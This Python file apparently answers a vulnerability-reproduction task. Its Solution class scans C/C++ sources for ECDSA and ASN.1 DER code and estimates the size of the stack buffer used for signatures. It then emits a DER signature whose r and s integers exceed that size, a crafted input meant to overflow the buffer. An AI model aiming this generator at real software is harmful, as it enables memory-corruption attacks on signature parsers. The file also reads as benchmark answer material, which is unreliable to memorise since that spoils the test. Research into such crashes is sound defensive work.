import os
import re
import ast
import tarfile
import zipfile
from typing import Dict, Iterator, List, Optional, Tuple


_ALLOWED_EXTS = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")


def _strip_c_comments_line(s: str) -> str:
    s = re.sub(r"//.*", "", s)
    s = re.sub(r"/\*.*?\*/", "", s)
    return s


_INT_SUFFIX_RE = re.compile(r"(?<=\b)(0x[0-9a-fA-F]+|\d+)(?:[uUlL]+)\b")


def _normalize_c_int_expr(expr: str) -> str:
    expr = expr.strip()
    expr = _strip_c_comments_line(expr)
    expr = expr.strip()
    if not expr:
        return ""
    expr = _INT_SUFFIX_RE.sub(r"\1", expr)
    expr = re.sub(r"\b(?:size_t|ssize_t|uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t|long|unsigned|signed|char|int)\b", "", expr)
    expr = re.sub(r"\(\s*\)", "", expr)
    expr = re.sub(r"\(\s*([A-Za-z_]\w*)\s*\)", r"\1", expr)
    expr = re.sub(r"\(\s*0x([0-9a-fA-F]+)\s*\)", r"0x\1", expr)
    expr = re.sub(r"\(\s*(\d+)\s*\)", r"\1", expr)
    expr = re.sub(r"\s+", " ", expr).strip()
    return expr


_ALLOWED_AST_NODES = (
    ast.Expression,
    ast.BinOp,
    ast.UnaryOp,
    ast.Constant,
    ast.Name,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.FloorDiv,
    ast.Div,
    ast.Mod,
    ast.LShift,
    ast.RShift,
    ast.BitOr,
    ast.BitAnd,
    ast.BitXor,
    ast.Invert,
    ast.UAdd,
    ast.USub,
    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
)


def _eval_ast(node: ast.AST, env: Dict[str, int]) -> int:
    if isinstance(node, ast.Expression):
        return _eval_ast(node.body, env)
    if isinstance(node, ast.Constant):
        if isinstance(node.value, bool):
            return int(node.value)
        if isinstance(node.value, int):
            return int(node.value)
        raise ValueError("non-int constant")
    if isinstance(node, ast.Name):
        if node.id in env:
            return int(env[node.id])
        raise KeyError(node.id)
    if isinstance(node, ast.UnaryOp):
        v = _eval_ast(node.operand, env)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary op")
    if isinstance(node, ast.BinOp):
        a = _eval_ast(node.left, env)
        b = _eval_ast(node.right, env)
        op = node.op
        if isinstance(op, ast.Add):
            return a + b
        if isinstance(op, ast.Sub):
            return a - b
        if isinstance(op, ast.Mult):
            return a * b
        if isinstance(op, (ast.Div, ast.FloorDiv)):
            if b == 0:
                raise ZeroDivisionError()
            return a // b
        if isinstance(op, ast.Mod):
            if b == 0:
                raise ZeroDivisionError()
            return a % b
        if isinstance(op, ast.LShift):
            return a << b
        if isinstance(op, ast.RShift):
            return a >> b
        if isinstance(op, ast.BitOr):
            return a | b
        if isinstance(op, ast.BitAnd):
            return a & b
        if isinstance(op, ast.BitXor):
            return a ^ b
        raise ValueError("bad binop")
    raise ValueError("bad ast node")


def _eval_c_int_expr(expr: str, env: Dict[str, int]) -> int:
    expr = _normalize_c_int_expr(expr)
    if not expr:
        raise ValueError("empty expr")
    if "sizeof" in expr:
        raise ValueError("sizeof not supported")
    if "{" in expr or "}" in expr:
        raise ValueError("braces not supported")
    if "?" in expr or ":" in expr:
        raise ValueError("ternary not supported")
    if "<<" in expr or ">>" in expr or "|" in expr or "&" in expr or "^" in expr or "~" in expr or "+" in expr or "-" in expr or "*" in expr or "/" in expr or "%" in expr or "(" in expr:
        pass
    else:
        if re.fullmatch(r"0x[0-9a-fA-F]+|\d+", expr):
            return int(expr, 0)
        if re.fullmatch(r"[A-Za-z_]\w*", expr):
            if expr in env:
                return int(env[expr])
            raise KeyError(expr)
        raise ValueError("unsupported expr form")
    tree = ast.parse(expr, mode="eval")
    for n in ast.walk(tree):
        if not isinstance(n, _ALLOWED_AST_NODES):
            raise ValueError("disallowed ast node")
        if isinstance(n, ast.Call):
            raise ValueError("calls not allowed")
        if isinstance(n, ast.Attribute):
            raise ValueError("attrs not allowed")
        if isinstance(n, ast.Subscript):
            raise ValueError("subs not allowed")
        if isinstance(n, ast.Compare):
            raise ValueError("compare not allowed")
        if isinstance(n, ast.BoolOp):
            raise ValueError("boolop not allowed")
    return int(_eval_ast(tree, env))


def _iter_files_from_path(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if not lfn.endswith(_ALLOWED_EXTS):
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        data = f.read(1024 * 1024)
                except OSError:
                    continue
                yield p, data
        return

    if tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not lname.endswith(_ALLOWED_EXTS):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(1024 * 1024)
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return
        return

    if zipfile.is_zipfile(src_path):
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    name = zi.filename
                    lname = name.lower()
                    if not lname.endswith(_ALLOWED_EXTS):
                        continue
                    try:
                        with zf.open(zi, "r") as f:
                            data = f.read(1024 * 1024)
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return
        return


_DEFINE_RE = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)(?:\s+(.*))?$")


def _collect_defines_and_relevant_texts(src_path: str) -> Tuple[Dict[str, str], List[str]]:
    raw_defines: Dict[str, str] = {}
    relevant_texts: List[str] = []

    for name, data in _iter_files_from_path(src_path):
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            continue

        for line in text.splitlines():
            m = _DEFINE_RE.match(line)
            if not m:
                continue
            macro = m.group(1)
            rest = m.group(2) or ""
            if "(" in macro:
                continue
            if not rest.strip():
                continue
            if rest.lstrip().startswith("(") and macro + "(" in line:
                continue
            if macro in raw_defines:
                continue
            raw_defines[macro] = rest.strip()

        low = text.lower()
        if "ecdsa" in low and ("asn" in low or "der" in low):
            relevant_texts.append(text)

    return raw_defines, relevant_texts


def _resolve_defines(raw: Dict[str, str]) -> Dict[str, int]:
    resolved: Dict[str, int] = {}
    for k, v in raw.items():
        vv = _normalize_c_int_expr(v)
        if re.fullmatch(r"0x[0-9a-fA-F]+|\d+", vv or ""):
            try:
                resolved[k] = int(vv, 0)
            except Exception:
                pass

    for _ in range(20):
        progress = False
        for k, v in raw.items():
            if k in resolved:
                continue
            expr = _normalize_c_int_expr(v)
            if not expr:
                continue
            if "sizeof" in expr or "{" in expr or "}" in expr or "?" in expr or ":" in expr:
                continue
            try:
                val = _eval_c_int_expr(expr, resolved)
            except Exception:
                continue
            if isinstance(val, int):
                resolved[k] = val
                progress = True
        if not progress:
            break
    return resolved


_ARRAY_RE = re.compile(
    r"\b(?:const\s+)?(?:unsigned\s+char|uint8_t|u8|byte|BYTE|unsigned\s+BYTE|unsigned\s+byte|char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n;]+)\s*\]"
)


def _guess_stack_buf_size(defines: Dict[str, int], relevant_texts: List[str]) -> int:
    weight0: List[int] = []
    weight1: List[int] = []
    weight2: List[int] = []
    all_sizes: List[int] = []

    def weight(var: str) -> int:
        v = var.lower()
        if v in ("r", "s", "sig", "signature", "rs", "rawsig", "sig_r", "sig_s", "rbuf", "sbuf"):
            return 0
        if "sig" in v or v in ("buf", "tmp", "der", "asn1", "out", "in", "enc", "dec"):
            return 1
        return 2

    for text in relevant_texts:
        for m in _ARRAY_RE.finditer(text):
            var = m.group(1)
            expr = m.group(2).strip()
            if "sizeof" in expr:
                continue
            exprn = _normalize_c_int_expr(expr)
            if not exprn:
                continue
            try:
                val = _eval_c_int_expr(exprn, defines)
            except Exception:
                continue
            if not isinstance(val, int):
                continue
            if val <= 0:
                continue
            if val < 16:
                continue
            if val > 200000:
                continue
            all_sizes.append(val)
            w = weight(var)
            if w == 0:
                weight0.append(val)
            elif w == 1:
                weight1.append(val)
            else:
                weight2.append(val)

    def pick_best(vals: List[int]) -> Optional[int]:
        if not vals:
            return None
        filt = [v for v in vals if 16 < v <= 8192]
        if filt:
            return max(filt)
        filt = [v for v in vals if 16 < v <= 16384]
        if filt:
            return max(filt)
        filt = [v for v in vals if 16 < v <= 50000]
        if filt:
            return max(filt)
        return None

    for group in (weight0, weight1, weight2, all_sizes):
        b = pick_best(group)
        if b is not None:
            return b

    macro_candidates = []
    for k, v in defines.items():
        lk = k.lower()
        if "ecdsa" in lk or "ecc" in lk:
            if "sig" in lk or "bytes" in lk or "size" in lk:
                if 16 < v <= 16384:
                    macro_candidates.append(v)
    if macro_candidates:
        return max(macro_candidates)

    return 1024


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 128:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_integer_of_len(n: int, fill: int) -> bytes:
    if n <= 0:
        data = b"\x00"
    else:
        first = b"\x01"
        if n == 1:
            data = first
        else:
            data = first + bytes([fill]) * (n - 1)
    return b"\x02" + _der_len(len(data)) + data


class Solution:
    def solve(self, src_path: str) -> bytes:
        raw_defines, relevant_texts = _collect_defines_and_relevant_texts(src_path)
        defines = _resolve_defines(raw_defines)
        buf_guess = _guess_stack_buf_size(defines, relevant_texts)

        comp_len = buf_guess + 1
        if comp_len < 256:
            comp_len = 256
        if comp_len > 25000:
            comp_len = 20893

        r = _der_integer_of_len(comp_len, ord("A"))
        s = _der_integer_of_len(comp_len, ord("B"))
        content = r + s
        sig = b"\x30" + _der_len(len(content)) + content
        return sig